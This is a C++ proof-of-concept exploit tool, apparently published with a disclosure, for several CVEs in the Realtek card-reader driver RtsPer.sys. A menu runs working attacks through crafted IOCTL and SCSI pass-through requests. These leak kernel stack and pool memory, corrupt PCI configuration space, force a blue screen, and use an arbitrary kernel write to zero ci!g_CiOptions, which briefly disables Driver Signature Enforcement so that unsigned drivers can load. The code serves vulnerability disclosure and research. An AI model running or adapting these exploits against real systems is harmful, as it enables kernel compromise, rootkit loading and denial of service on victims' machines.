#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <SetupAPI.h>
#include <ntddscsi.h>
#include <initguid.h>
#include <stdio.h>

//
// From wdm.h
//
#define PCI_TYPE0_ADDRESSES             6
#define PCI_TYPE1_ADDRESSES             2
#define PCI_TYPE2_ADDRESSES             5

typedef struct _PCI_COMMON_HEADER {
    USHORT  VendorID;                   // (ro)
    USHORT  DeviceID;                   // (ro)
    USHORT  Command;                    // Device control
    USHORT  Status;
    UCHAR   RevisionID;                 // (ro)
    UCHAR   ProgIf;                     // (ro)
    UCHAR   SubClass;                   // (ro)
    UCHAR   BaseClass;                  // (ro)
    UCHAR   CacheLineSize;              // (ro+)
    UCHAR   LatencyTimer;               // (ro+)
    UCHAR   HeaderType;                 // (ro)
    UCHAR   BIST;                       // Built in self test

    union {
        struct _PCI_HEADER_TYPE_0 {
            ULONG   BaseAddresses[PCI_TYPE0_ADDRESSES];
            ULONG   CIS;
            USHORT  SubVendorID;
            USHORT  SubSystemID;
            ULONG   ROMBaseAddress;
            UCHAR   CapabilitiesPtr;
            UCHAR   Reserved1[3];
            ULONG   Reserved2;
            UCHAR   InterruptLine;      //
            UCHAR   InterruptPin;       // (ro)
            UCHAR   MinimumGrant;       // (ro)
            UCHAR   MaximumLatency;     // (ro)
        } type0;



        //
        // PCI to PCI Bridge
        //

        struct _PCI_HEADER_TYPE_1 {
            ULONG   BaseAddresses[PCI_TYPE1_ADDRESSES];
            UCHAR   PrimaryBus;
            UCHAR   SecondaryBus;
            UCHAR   SubordinateBus;
            UCHAR   SecondaryLatency;
            UCHAR   IOBase;
            UCHAR   IOLimit;
            USHORT  SecondaryStatus;
            USHORT  MemoryBase;
            USHORT  MemoryLimit;
            USHORT  PrefetchBase;
            USHORT  PrefetchLimit;
            ULONG   PrefetchBaseUpper32;
            ULONG   PrefetchLimitUpper32;
            USHORT  IOBaseUpper16;
            USHORT  IOLimitUpper16;
            UCHAR   CapabilitiesPtr;
            UCHAR   Reserved1[3];
            ULONG   ROMBaseAddress;
            UCHAR   InterruptLine;
            UCHAR   InterruptPin;
            USHORT  BridgeControl;
        } type1;

        //
        // PCI to CARDBUS Bridge
        //

        struct _PCI_HEADER_TYPE_2 {
            ULONG   SocketRegistersBaseAddress;
            UCHAR   CapabilitiesPtr;
            UCHAR   Reserved;
            USHORT  SecondaryStatus;
            UCHAR   PrimaryBus;
            UCHAR   SecondaryBus;
            UCHAR   SubordinateBus;
            UCHAR   SecondaryLatency;
            struct {
                ULONG   Base;
                ULONG   Limit;
            }       Range[PCI_TYPE2_ADDRESSES - 1];
            UCHAR   InterruptLine;
            UCHAR   InterruptPin;
            USHORT  BridgeControl;
        } type2;



    } u;

} PCI_COMMON_HEADER, * PPCI_COMMON_HEADER;

//SCSI commands used in the PoC
constexpr UCHAR SD_CMD_READ_CAPACITY = 0x25;
constexpr UCHAR SD_CMD_NO_SUCH_CMD = 0x30;

//vendor-specific commands
constexpr UCHAR SD_CMD_VNDR = 0xF0;
//vendor-specific subcommand 0x0A
constexpr UCHAR SD_CMD_VNDR_0A = 0x0A;
//vendor-specific subcommand app command
constexpr UCHAR SD_CMD_VNDR_APP = 0x10;
//app command buffer subcommand
constexpr UCHAR SD_CMD_VNDR_APP_CMDBUF = 0xE0;
//command buffer subcommands
constexpr UCHAR SD_CMD_VNDR_APP_CMDBUF_INIT = 0x41;
constexpr UCHAR SD_CMD_VNDR_APP_CMDBUF_ADDCMD = 0x42;
constexpr UCHAR SD_CMD_VNDR_APP_CMDBUF_FETCH = 0x44;

//code 0x2D2328
#define IOCTL_GET_LOG CTL_CODE(FILE_DEVICE_MASS_STORAGE, 0x8CA, METHOD_BUFFERED, FILE_ANY_ACCESS)
//code 0x2D2190
#define IOCTL_READ_PCI_CONFIG CTL_CODE(FILE_DEVICE_MASS_STORAGE, 0x864, METHOD_BUFFERED, FILE_ANY_ACCESS)
//code 0x2D2194
#define IOCTL_WRITE_PCI_CONFIG CTL_CODE(FILE_DEVICE_MASS_STORAGE, 0x865, METHOD_BUFFERED, FILE_ANY_ACCESS)

DEFINE_GUID(DevInterfaceGuid, 0xb6a6b22e, 0xd723, 0x4e95, 0xa5, 0x18, 0x6c, 0xbd, 0xbf, 0xa8, 0xcb, 0x61);

// I'm a lazy ass; I don't want to allocate memory manually.
CHAR LogData[0x100000];

VOID DumpBuffer(PVOID Buffer, ULONG Length)
{
    PUCHAR buf = (PUCHAR)Buffer;
    for (ULONG i = 0; i < Length; i += 0x10)
    {
        printf("%08lx ", i); // Print the offset

        // Print the hex representation
        for (ULONG j = 0; j < 0x10; ++j)
        {
            if (i + j < Length)
            {
                printf("%02x ", buf[i + j]);
            }
            else
            {
                printf("   "); // Padding for incomplete row
            }
        }

        // Print the ASCII representation
        printf(" ");
        for (ULONG j = 0; j < 0x10; ++j)
        {
            if (i + j < Length)
            {
                unsigned char c = buf[i + j];
                printf("%c", isprint(c) ? c : '.');
            }
        }

        printf("\n");
    }
}

BOOL ReadAddressHex(PULONG_PTR OutAddress)
{
    CHAR StrAddress[17];
    BOOL r = FALSE;

    *OutAddress = 0;
    if (scanf("%16s", StrAddress) != 1)
    {
        printf("Input error\n");
        return r;
    }

    r = TRUE;
    for (int i = 0; i < 16 && StrAddress[i] != '\0'; i++)
    {
        if (isxdigit(StrAddress[i]) == 0)
        {
            r = FALSE;
            break;
        }
    }

    *OutAddress = strtoull(StrAddress, nullptr, 16);

    return r;
}

HANDLE OpenRealtekDeivce()
{
    HANDLE hDevice = INVALID_HANDLE_VALUE;

    HDEVINFO hDevInfo = SetupDiGetClassDevsW(
        &DevInterfaceGuid,
        nullptr,
        nullptr,
        DIGCF_PRESENT | DIGCF_DEVICEINTERFACE
    );

    if (hDevInfo == INVALID_HANDLE_VALUE)
    {
        printf("SetupDiGetClassDevsW failed: %d\n", GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    SP_DEVICE_INTERFACE_DATA InterfaceData;
    ZeroMemory(&InterfaceData, sizeof(SP_DEVICE_INTERFACE_DATA));
    InterfaceData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);
    BOOL r = SetupDiEnumDeviceInterfaces(
        hDevInfo,
        nullptr,
        &DevInterfaceGuid,
        0,
        &InterfaceData
    );
    if (r == FALSE)
    {
        printf("SetupDiEnumDeviceInterfaces failed: %d\n", GetLastError());
        SetupDiDestroyDeviceInfoList(hDevInfo);
    }

    DWORD RequiredSize = 0;
    SetupDiGetDeviceInterfaceDetailW(
        hDevInfo,
        &InterfaceData,
        0,
        0,
        &RequiredSize,
        0
    );

    DWORD err = GetLastError();
    if (err != ERROR_INSUFFICIENT_BUFFER)
    {
        printf("SetupDiGetDeviceInterfaceDetailW unexpected error: %d\n", err);
        SetupDiDestroyDeviceInfoList(hDevInfo);
        return INVALID_HANDLE_VALUE;
    }

    PSP_DEVICE_INTERFACE_DETAIL_DATA pDetailData = (PSP_DEVICE_INTERFACE_DETAIL_DATA)HeapAlloc(GetProcessHeap(), 0, RequiredSize);
    if (pDetailData)
    {
        pDetailData->cbSize = sizeof(*pDetailData);
        r = SetupDiGetDeviceInterfaceDetailW(
            hDevInfo,
            &InterfaceData,
            pDetailData,
            RequiredSize,
            &RequiredSize,
            0);
        if (r == FALSE)
        {
            printf("SetupDiGetDeviceInterfaceDetailW failed: %d\n", GetLastError());
        }
        else
        {
            hDevice = CreateFileW(
                pDetailData->DevicePath,
                0x001201bf,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                nullptr,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                nullptr
            );
            if (hDevice == INVALID_HANDLE_VALUE)
            {
                printf("CreateFileW failed: %d\n", GetLastError());
            }
        }
    }

    if (pDetailData != nullptr)
    {
        HeapFree(GetProcessHeap(), 0, pDetailData);
    }
    SetupDiDestroyDeviceInfoList(hDevInfo);

    return hDevice;
}

VOID SaveLogToFile(PVOID Buffer, ULONG Size)
{

    DWORD RealSize = strlen((char*)Buffer);
    FILE* f = fopen("rts.log", "w");
    if (f == nullptr)
    {
        printf("fopen failed\n");
    }
    else
    {
        auto r = fwrite(Buffer, 1, RealSize, f);
        if (r == 0)
        {
            printf("fwrite failed\n");
        }
        fclose(f);
    }
}

//
// CVE-2022-25477-1
//
BOOL GetLogs1(HANDLE hDevice)
{
    //
    //  Retrieving logs-1 (old version?)
    //

    DWORD BytesReturned = 0;
    BOOL r = DeviceIoControl(hDevice, IOCTL_GET_LOG, nullptr, 0, LogData, sizeof(LogData), &BytesReturned, nullptr);
    if (r == FALSE)
    {
        printf("DeviceIoControl IOCTL_GET_LOG failed: %d\n", GetLastError());
    }
    else
    {
        SaveLogToFile(LogData, BytesReturned);
    }

    return r;
}

//
// CVE-2022-25477-2
//
BOOL GetLogs2(HANDLE hDevice)
{
    //
    // Retrieving logs-2
    //
    struct LogDescriptor
    {
        ULONG Size;
        PVOID Buffer;
    } desc;
    desc.Buffer = LogData;
    desc.Size = sizeof(LogData);

    DWORD BytesReturned = 0;
    BOOL r = DeviceIoControl(hDevice, IOCTL_GET_LOG, &desc, sizeof(desc), nullptr, 0, &BytesReturned, nullptr);
    if (r == FALSE)
    {
        printf("DeviceIoControl IOCTL_GET_LOG failed: %d\n", GetLastError());
    }
    else
    {
        SaveLogToFile(LogData, BytesReturned);
    }

    return r;
}

//
// CVE-2022-25478
//
BOOL ReadWritePCIConfig(HANDLE hDevice, ULONG NewBarAddress)
{
    //
    // The PoC demonstrates reading from and writing to the PCI config space.
    //
    PCI_COMMON_HEADER PciHeader;

#pragma pack (push, 1)
    struct PCIDescriptor
    {
        WORD CfgSpaceOffset;
        BYTE Length;
        PCI_COMMON_HEADER PciHeader;
    } PCIDesc;
#pragma pack (pop)

    DWORD BytesReturned;
    PCIDesc.CfgSpaceOffset = 0;
    PCIDesc.Length = sizeof(PciHeader); //max 0xFF
    BOOL r = DeviceIoControl(hDevice, IOCTL_READ_PCI_CONFIG, &PCIDesc, sizeof(PCIDesc), &PCIDesc.PciHeader, sizeof(PCIDesc.PciHeader), &BytesReturned, 0);
    if (r == FALSE)
    {
        printf("DeviceIoControl IOCTL_READ_PCI_CONFIG failed: %d\n", GetLastError());
    }

    PCIDesc.PciHeader.u.type0.BaseAddresses[0] = NewBarAddress;

    PCIDesc.CfgSpaceOffset = 0;
    PCIDesc.Length = sizeof(PciHeader); //max 0xFF

    r = DeviceIoControl(hDevice, IOCTL_WRITE_PCI_CONFIG, &PCIDesc, sizeof(PCIDesc), nullptr, 0, &BytesReturned, 0);
    if (r == FALSE)
    {
        printf("DeviceIoControl IOCTL_WRITE_PCI_CONFIG failed: %d\n", GetLastError());
    }

    return r;
}

//
// CVE-2022-25479-a
//
BOOL LeakKernelStack(HANDLE hDevice, PVOID Buffer, ULONG Length)
{
    //
    // Leaks content from the stack of the request.
    //
    SCSI_PASS_THROUGH_DIRECT Sptd;

    RtlZeroMemory(&Sptd, sizeof(Sptd));
    Sptd.Length = sizeof(Sptd);
    Sptd.Cdb[0] = SD_CMD_VNDR;
    Sptd.Cdb[1] = SD_CMD_VNDR_0A;

    Sptd.DataBuffer = Buffer;
    Sptd.DataTransferLength = Length;
    RtlFillMemory(Buffer, Length, 0xDD);

    DWORD BytesReturned;
    BOOL r = DeviceIoControl(hDevice, IOCTL_SCSI_PASS_THROUGH_DIRECT, &Sptd, sizeof(Sptd), &Sptd, sizeof(Sptd), &BytesReturned, 0);
    if (r == FALSE)
    {
        printf("DeviceIoControl IOCTL_SCSI_PASS_THROUGH_DIRECT leak stack failed: %d\n", GetLastError());
    }

    return r;
}

//
// CVE-2022-25479-b
//
BOOL LeakKernelPool(HANDLE hDevice, PVOID Buffer, ULONG Length)
{

    //
    // Leaks pool content. Only works when an SD card is inserted!
    //
    SCSI_PASS_THROUGH_DIRECT Sptd;

    RtlZeroMemory(&Sptd, sizeof(Sptd));
    Sptd.Length = sizeof(Sptd);
    Sptd.Cdb[0] = SD_CMD_READ_CAPACITY;

    Sptd.DataBuffer = Buffer;
    Sptd.DataTransferLength = Length;
    RtlFillMemory(Buffer, Length, 0xDD);

    DWORD BytesReturned;
    BOOL r = DeviceIoControl(hDevice, IOCTL_SCSI_PASS_THROUGH_DIRECT, &Sptd, sizeof(Sptd), &Sptd, sizeof(Sptd), &BytesReturned, 0);
    if (r == FALSE)
    {
        printf("DeviceIoControl IOCTL_SCSI_PASS_THROUGH_DIRECT pool leak failed: %d\n", GetLastError());
    }
    if (Sptd.ScsiStatus != 0)
    {
        r = FALSE;
    }

    return r;
}

//
// CVE-2022-25480
//
VOID OverrunSystemBuffer(HANDLE hDevice)
{
    //
    // The PoC issues a non-existing SCSI command to intentionally fail the request.
    // The failure causes copying of sense information at SystemBuffer + SenseInfoOffset,
    // which is 0xFFFFFFFF. Such a bad memory write causes a BSoD...
    //
    SCSI_PASS_THROUGH_DIRECT Sptd;

    RtlZeroMemory(&Sptd, sizeof(Sptd));
    Sptd.SenseInfoLength = 0xC;
    Sptd.SenseInfoOffset = 0xFFFFFFFF;
    Sptd.Cdb[0] = SD_CMD_NO_SUCH_CMD;

    DWORD BytesReturned;
    BOOL r = DeviceIoControl(hDevice, IOCTL_SCSI_PASS_THROUGH_DIRECT, &Sptd, sizeof(Sptd), &Sptd, sizeof(Sptd), &BytesReturned, 0);
    if (r == FALSE)
    {
        printf("DeviceIoControl IOCTL_SCSI_PASS_THROUGH_DIRECT write SenseInfo failed: %d\n", GetLastError());
    }
    else
    {
        printf("If you read this, it didn't work\n");
    }
}

//
// CVE-2024-40431
//
VOID WriteKernelAddressByte(HANDLE hDevice, ULONG_PTR KernelAddress, UCHAR Value)
{
    //
    // This PoC is a bit trickier than the others. The vulnerability allows writing to an arbitrary kernel address.
    // The write is relative to the SystemBuffer, so we need to know the address of SystemBuffer in advance. 
    // To figure it out, we leak the stack using CVE-2022-25479 in an endless loop, extract the address of SystemBuffer each time, 
    // and compare it to the value extracted at the previous iteration.
    // At some point the memory manager's determinism kicks in by allocating the same address for the SystemBuffer repeatedly. 
    // Once we see that the address of the SystemBuffer hasn't changed, say, 256 times, it's safe to assume it won't change the 257th time.
    //
    // RtsPer.sys copies the output of the SCSI request to the SystemBuffer at the user-provided offset.
    // To write arbitrary data to kernel memory, we need to control the output of the request.
    // The easiest way to achieve this is to use the driver's command buffer controls, which allow writing data to the command buffer and fetching data from it.
    // To write the value to the target address, we first write it to the command buffer
    // and then fetch it back, providing an offset between the target address and the SystemBuffer.
    //

    // The offset of SystemBuffer in the stack dump differs across versions of the driver.
    constexpr SIZE_T SystemBufferStackOffset_RtsPer_10_0_16299_21305 = 0x210;

    constexpr SIZE_T ScsiBufferLength = 0x300;
    constexpr DWORD  SystemBufferNoChangeMinimum = 0x100;
    struct
    {
        SCSI_PASS_THROUGH Spt;
        UCHAR Buffer[ScsiBufferLength];
    } SptBuf;

    //
    // Leak the stack until the value of SystemBuffer remains the same for SystemBufferNoChangeMinimum consecutive times.
    //
    DWORD Counter = 0;
    ULONG_PTR PrevBufferAddress = 0;
    DWORD BytesReturned;
    for (;;)
    {

        RtlZeroMemory(&SptBuf, sizeof(SptBuf));
        SptBuf.Spt.Length = sizeof(SptBuf.Spt);
        SptBuf.Spt.Cdb[0] = SD_CMD_VNDR;    //0xF0
        SptBuf.Spt.Cdb[1] = SD_CMD_VNDR_0A; //0x0A
        SptBuf.Spt.DataBufferOffset = sizeof(SCSI_PASS_THROUGH);
        SptBuf.Spt.DataTransferLength = 0x300;
        BOOL r = DeviceIoControl(hDevice, IOCTL_SCSI_PASS_THROUGH, &SptBuf, sizeof(SptBuf), &SptBuf, sizeof(SptBuf), &BytesReturned, 0);
        if (r == FALSE)
        {
            printf("DeviceIoControl IOCTL_SCSI_PASS_THROUGH failed: %d\n", GetLastError());
        }
        else
        {
            PULONG_PTR p = (PULONG_PTR)(&SptBuf.Buffer[SystemBufferStackOffset_RtsPer_10_0_16299_21305]);
            printf("%p\n", *p);
            if (PrevBufferAddress == *p)
            {
                Counter++;
            }
            else
            {
                PrevBufferAddress = *p;
                Counter = 0;
            }
        }

        if (Counter >= SystemBufferNoChangeMinimum)
        {
            printf("SystemBuffer at %p didn't change %d times\n", PrevBufferAddress, Counter);
            break;
        }
    }

    //
    // Calculate the offset from the SystemBuffer to the target kernel address.
    //
    ULONG_PTR KernelAddressOffset = KernelAddress - PrevBufferAddress;

    //
    // Initialize the command buffer.
    //
    RtlZeroMemory(&SptBuf, sizeof(SptBuf));
    SptBuf.Spt.Length = sizeof(SptBuf.Spt);
    SptBuf.Spt.Cdb[0] = SD_CMD_VNDR;                 //0xF0
    SptBuf.Spt.Cdb[1] = SD_CMD_VNDR_APP;             //0x10
    SptBuf.Spt.Cdb[2] = SD_CMD_VNDR_APP_CMDBUF;      //0xE0
    SptBuf.Spt.Cdb[3] = SD_CMD_VNDR_APP_CMDBUF_INIT; //0x41

    SptBuf.Spt.DataBufferOffset = sizeof(SCSI_PASS_THROUGH);
    SptBuf.Spt.DataTransferLength = 0x4;

    BOOL r = DeviceIoControl(hDevice, IOCTL_SCSI_PASS_THROUGH, &SptBuf, sizeof(SptBuf), &SptBuf, sizeof(SptBuf), &BytesReturned, 0);
    if (r == FALSE)
    {
        printf("DeviceIoControl IOCTL_SCSI_PASS_THROUGH failed: %d\n", GetLastError());
    }
    else
    {
        printf("Command buffer initialized\n");
    }

    //
    // Write the value we want to copy to the target address to the command buffer. 
    // For simplicity, the PoC writes only 1 byte, but it's possible to write more than a byte with a single request.
    //
    RtlZeroMemory(&SptBuf, sizeof(SptBuf));
    SptBuf.Spt.Length = sizeof(SptBuf.Spt);
    SptBuf.Spt.Cdb[0] = SD_CMD_VNDR;                   //0xF0
    SptBuf.Spt.Cdb[1] = SD_CMD_VNDR_APP;               //0x10
    SptBuf.Spt.Cdb[2] = SD_CMD_VNDR_APP_CMDBUF;        //0xE0
    SptBuf.Spt.Cdb[3] = SD_CMD_VNDR_APP_CMDBUF_ADDCMD; //0x42
    SptBuf.Spt.Cdb[8] = Value;


    r = DeviceIoControl(hDevice, IOCTL_SCSI_PASS_THROUGH, &SptBuf, sizeof(SptBuf), &SptBuf, sizeof(SptBuf), &BytesReturned, 0);
    if (r == FALSE)
    {
        printf("DeviceIoControl IOCTL_SCSI_PASS_THROUGH failed: %d\n", GetLastError());
    }
    else
    {
        printf("Command buffer written\n");
    }

    //
    // Finally, fetch previously written data from the command buffer. 
    // The data will be written to the target kernel address.
    //
    SptBuf.Spt.Cdb[0] = SD_CMD_VNDR;                  //0xF0
    SptBuf.Spt.Cdb[1] = SD_CMD_VNDR_APP;              //0x10
    SptBuf.Spt.Cdb[2] = SD_CMD_VNDR_APP_CMDBUF;       //0xE0
    SptBuf.Spt.Cdb[3] = SD_CMD_VNDR_APP_CMDBUF_FETCH; //0x44

    SptBuf.Spt.DataBufferOffset = KernelAddressOffset;
    SptBuf.Spt.DataTransferLength = 0x1;

    r = DeviceIoControl(hDevice, IOCTL_SCSI_PASS_THROUGH, &SptBuf, sizeof(SptBuf), &SptBuf, sizeof(SptBuf), &BytesReturned, 0);
    if (r == FALSE)
    {
        printf("DeviceIoControl IOCTL_SCSI_PASS_THROUGH failed: %d\n", GetLastError());
    }
    else
    {
        printf("Command buffer copied to the target address\n");
    }
}

//
// Handlers of the main menu choices.
//
VOID GetLogsHandler(HANDLE hDevice)
{
    printf("Getting driver logs\n");

    BOOL r = GetLogs1(hDevice);
    if (r == FALSE)
    {
        r = GetLogs2(hDevice);
    }

    if (r == TRUE)
    {
        printf("Log stored to rts.log\n");
    }
}

VOID SmashPCIConfigHandler(HANDLE hDevice)
{
    printf("Smashing PCI config\n");

    //just some random BAR address
    BOOL r = ReadWritePCIConfig(hDevice, 0x10000);

    if (r == TRUE)
    {
        printf("Success. The interrupt storm is coming...\n");
    }
}

VOID LeakKernelPoolHandler(HANDLE hDevice)
{
    UCHAR PoolContent[0x80] = {};

    printf("Leaking 0x80 bytes of kernel pool\n");

    BOOL r = LeakKernelPool(hDevice, PoolContent, 0x80);
    if (r == FALSE)
    {
        printf("Failed. SD card not inserted, maybe?\n");
    }
    else
    {
        printf("Succes, printing buffer:\n");
        DumpBuffer(PoolContent, 0x80);
    }
}

VOID LeakKernelStackHandler(HANDLE hDevice)
{
    UCHAR StackContent[0x80] = {};

    printf("Leaking 0x80 bytes of kernel stack\n");

    BOOL r = LeakKernelStack(hDevice, StackContent, 0x80);
    if (r == FALSE)
    {
        printf("Failed\n");
    }
    else
    {
        printf("Succes, printing buffer:\n");
        DumpBuffer(StackContent, 0x80);
    }
}

VOID DisableDSEHandler(HANDLE hDevice)
{
    ULONG_PTR ci_g_CiOptions = 0;

    printf("Enter address of ci!g_CiOptions: \n");
    BOOL r = ReadAddressHex(&ci_g_CiOptions);
    if (r == FALSE)
    {
        printf("Invalid address\n");
        return;
    }

    if (ci_g_CiOptions == 0)
    {
        printf("ci!g_CiOptions is 0\n");
        return;
    }

    printf("Zeroing out ci!g_CiOptions at %p\n", ci_g_CiOptions);
    WriteKernelAddressByte(hDevice, ci_g_CiOptions, 0);
    printf("Sleeping 30 secsonds. Time to load unsigned drivers!\n");
    Sleep(30 * 1000);
    printf("Restoring ci!g_CiOptions\n");
    WriteKernelAddressByte(hDevice, ci_g_CiOptions, 6);
    printf("ci!g_CiOptions restored\n");
}

VOID PrintHelp()
{
    printf("Proof of concepts for vulnerabilities in RtsPer.sys:\n");
    printf("\n");
    printf("[0] CVE-2022-25477   - stores driver logs to a file\n");
    printf("[1] CVE-2022-25478   - reading from and writing to the PCI configuration space. Warning, it causes interrupt storm!\n");
    printf("[2] CVE-2022-25479-a - reading from the kernel stack memory\n");
    printf("[3] CVE-2022-25479-b - reading from the kernel pool memory\n");
    printf("[4] CVE-2022-25480   - overruning the SystemBuffer. Warning, it blue screens!\n");
    printf("[5] CVE-6            - writing to an arbitrary kernel memory address.\n"
        "                       The PoC zeroes out ci!g_CiOptions for 30 seconds, then restores its original value.\n"
        "                       Feel free to load your dirty unsigned drivers while DSE is off.\n"
        "                       You have to provide the address of ci!g_CiOptions by yourself, though.\n");
    printf("[6] exit\n");
}

int main(int argc, char** argv)
{
    HANDLE hDevice = OpenRealtekDeivce();
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        return -1;
    }

    for (;;)
    {
        PrintHelp();
        printf("Enter option number: ");

        int option;
        while ((option = getchar()) == '\n')
        {
            ;
        }
        while (getchar() != '\n')
        {
            ;
        }
        printf("\n");

        switch (option)
        {
        case '0':
            GetLogsHandler(hDevice);
            break;
        case '1':
            SmashPCIConfigHandler(hDevice);
            break;
        case '2':
            LeakKernelStackHandler(hDevice);
            break;
        case '3':
            LeakKernelPoolHandler(hDevice);
            break;
        case '4':
            OverrunSystemBuffer(hDevice);
            break;
        case '5':
            DisableDSEHandler(hDevice);
            break;
        case '6':
            exit(0);
        default:
            printf("Unknown option\n");
            continue;
        }

        printf("********\n\n");
    }

    CloseHandle(hDevice);

    return 0;
}
